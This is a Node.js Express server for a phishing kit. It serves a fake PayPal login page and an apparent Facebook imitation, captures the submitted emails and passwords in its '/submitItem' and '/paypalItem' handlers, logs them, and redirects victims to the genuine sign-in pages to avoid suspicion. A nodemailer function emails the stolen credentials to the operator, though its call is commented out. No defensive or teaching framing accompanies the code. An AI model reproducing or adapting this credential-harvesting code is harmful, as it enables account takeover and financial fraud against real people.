const express = require('express')
const path = require('path')
const app = express()
const port = 3000
const nodemailer = require('nodemailer')
const bodyParser = require('body-parser')
require('dotenv').config();


app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

const sendPayload = (email,payload) => {   
    
    let transporter = nodemailer.createTransport({
      service: 'gmail',
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: process.env.EMAIL,
        pass: process.env.EMAIL_PASSWORD,
      },
    });
  
    let mailOptions = {
      from: process.env.EMAIL,
      to: email,
      subject: 'users details',
      text: `here is the users details: ${payload}`,
    };
  
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
          logger.error('Error sending email:', error);
        } else {
          logger.info('Email sent:', info.response)
        }
      });
  
  }

  app.use(express.json());
  app.use(bodyParser.urlencoded({ extended: true }));

app.get('/', (req, res) => {
    res.render('pages/index')
})

app.get('/paypal-login', (req, res) => {
  res.render('pages/paypal')
})

app.post('/submitItem',(req, res) => {
    const {email,pass} = req.body
    console.log(email,pass)
    res.redirect('https://en-gb.facebook.com/login.php/')
    const payload = `email: ${email} : password: ${pass}`
    console.log(`user payload ${payload}` )
    // sendPayload(process.env.EMAIL,payload)
})

app.post('/paypalItem',(req, res) => {
  const {login_email,login_password} = req.body
  console.log(`email address: ${login_email} and password ${login_password}`)
  res.redirect('https://www.paypal.com/signin?country.x=NG&locale.x=en_US')
})

app.listen(port,()=>{
    console.log(`app listening on ${port}`);
})